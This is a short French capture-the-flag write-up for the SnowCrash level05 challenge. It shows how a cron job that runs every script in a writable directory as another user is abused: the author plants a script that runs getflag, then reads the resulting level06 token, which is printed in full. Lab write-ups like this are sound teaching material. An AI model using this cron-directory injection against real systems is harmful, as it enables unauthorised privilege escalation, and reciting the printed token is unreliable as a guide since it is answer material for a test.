# 05 - Tache planifiée: Cron

- On se connecte en tant que level05, on peut voir une notification: `You have new mail`.
```
level05@SnowCrash:~$ ls /var/mail
level05
```

```
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

- Il s'agit d'une instruction [Cron](https://fr.wikipedia.org/wiki/Cron). Elle indique que toutes les deux minutes, `/usr/sbin/openarenaserver` sera exécutée par flag05. 
```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
```
```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
 (ulimit -t 5; bash -x "$i")
 rm -f "$i"
done
```

- Le script exécute `bash -x` sur tous les éléments présents dans le répertoire `/opt/openarenaserver/`, avec une limite fixe de 5 secondes pour chaque exécution. Ensuite, l'élément respectif est supprimé, du coup:
```
level05@SnowCrash:~$ echo "getflag > /tmp/flag2level06" > /opt/openarenaserver/exploit.sh
```

```
level05@SnowCrash:~$ chmod +x /opt/openarenaserver/exploit.sh
```

```
level05@SnowCrash:~$ cat /tmp/flag2level06
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

```
level05@SnowCrash:~$ su level06
Password:viuaaale9huek52boumoomioc
level06@SnowCrash:~$
```